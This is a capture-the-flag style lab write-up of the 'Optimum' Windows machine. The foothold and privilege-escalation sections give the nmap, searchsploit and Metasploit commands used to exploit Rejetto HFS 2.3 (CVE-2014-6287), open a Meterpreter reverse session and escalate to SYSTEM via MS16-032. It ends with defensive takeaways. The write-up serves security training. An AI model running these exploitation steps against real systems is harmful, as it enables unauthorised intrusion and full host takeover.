Summary

Optimum is a beginner-level Windows machine that focuses on identifying a vulnerable web service, using a known exploit to gain an initial foothold, and then performing local privilege escalation. The machine was running Rejetto HTTP File Server 2.3, which was vulnerable to remote command execution. After gaining a Meterpreter session as the user kostas, local enumeration showed the system was Windows Server 2012 R2. The machine was then escalated to NT AUTHORITY\SYSTEM using the MS16-032 Secondary Logon Handle Privilege Escalation exploit.

Recon / Enumeration

nmap -sC -sV -oA optimum 10.129.9.194

This scan found a total of 1 TCP port open on the remote host.

Port Service Version Notes Vulnerabilities
80 HTTP HttpFileServer httpd 2.3 The web page identified itself as HFS / HttpFileServer 2.3. Rejetto HFS Remote Command Execution, CVE-2014-6287

Initial Foothold

The initial Nmap scan revealed that only port 80 was open. Visiting the website showed that the server was running HttpFileServer 2.3, also known as Rejetto HFS. Since the service version was exposed, I searched for known exploits related to HFS 2.3. 

searchsploit httpd 2.3

The first SearchSploit query did not find the correct exploit because the search term was too broad. I then searched inside Metasploit for HFS 2.3 and CVE-2014-6287. Metasploit showed the module exploit/windows/http/rejetto_hfs_exec, which targets Rejetto HTTP File Server remote command execution. 

msfconsole
search HFS 2.3
search cve:2014-6287
use exploit/windows/http/rejetto_hfs_exec
show options
set RHOSTS 10.129.9.194
set LHOST tun0
run

The exploit successfully sent a malicious request to the HFS service and opened a Meterpreter session. The session landed in the user directory for kostas. 

pwd
dir
cat user.txt
getuid

The user flag was found on the desktop of the kostas user. 

C:\Users\kostas\Desktop\user.txt

Privilege Escalation

After gaining the initial Meterpreter session, I checked the current user and system information. The session was running as OPTIMUM\kostas, and the target was identified as Windows Server 2012 R2 x64. 

getuid
sysinfo

I attempted to access the Administrator directory but received an access denied message, confirming that the current user did not have administrator privileges. 

cd C:\Users\Administrator

I then listed running processes and migrated into a stable x64 process. After that, I backgrounded the Meterpreter session and used Metasploit's local exploit suggester module to identify possible privilege escalation paths. 

ps
migrate 1788
background

use post/multi/recon/local_exploit_suggester
set SESSION 1
run

The local exploit suggester returned several possible modules. Some UAC bypass modules failed because the user was not in the local administrators group, and some failed because of architecture mismatch. The working privilege escalation path was exploit/windows/local/ms16_032_secondary_logon_handle_privesc. 

use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
set LHOST tun0
run

The exploit successfully opened a second Meterpreter session as NT AUTHORITY\SYSTEM. From there, I was able to access the Administrator desktop and read the root flag. 

getuid
cd C:\
cd Users\Administrator\Desktop
cat root.txt

Vulnerabilities / Misconfiguration

The main vulnerability was Rejetto HTTP File Server 2.3 Remote Command Execution, commonly associated with CVE-2014-6287. The service was exposed on port 80 and clearly identified itself through the HTTP title and server header.

The privilege escalation vulnerability was MS16-032 Secondary Logon Handle Privilege Escalation. This allowed escalation from the low-privileged kostas user to NT AUTHORITY\SYSTEM.

Defensive Takeaways

Outdated and vulnerable web services should not be exposed to the network, especially when known public exploits exist. Software like Rejetto HFS should be updated, removed, or placed behind strict access controls. Version disclosure should also be limited where possible because it helps attackers quickly identify known vulnerabilities.

The host was also vulnerable to a local privilege escalation exploit. Keeping Windows systems fully patched is critical because an attacker who gains even low-privileged access may be able to escalate to SYSTEM if local vulnerabilities are not remediated.

Lessons Learned

This machine reinforced the importance of service enumeration and researching exposed versions. The foothold came from identifying HFS 2.3 and matching it to a known Metasploit module.

I also practiced using Meterpreter commands such as getuid, sysinfo, ps, migrate, background, and file navigation commands to move through the target system and retrieve the user and root flags.
